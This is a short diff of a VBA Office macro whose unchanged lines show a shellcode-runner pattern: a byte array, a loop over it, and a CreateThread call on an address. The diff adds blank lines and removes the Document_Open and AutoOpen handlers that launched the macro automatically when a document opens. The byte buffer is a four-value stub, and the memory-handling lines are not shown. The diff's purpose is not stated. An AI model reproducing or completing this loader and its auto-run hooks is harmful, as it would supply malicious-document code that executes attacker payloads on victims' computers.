@@ -9,6 +9,8 @@ Sub Macro()
     Dim data As Long
     Dim res As Long
     
+
+    
     buf = Array(11, 247, 158, 15)
 
     For i = 0 To UBound(buf)
@@ -22,12 +24,4 @@ Sub Macro()
     Next counter
     
     res = CreateThread(0, 0, addr, 0, 0, 0)
-End Sub
-
-Sub Document_Open()
-    Macro
-End Sub
-
-Sub AutoOpen()
-    Macro
 End Sub
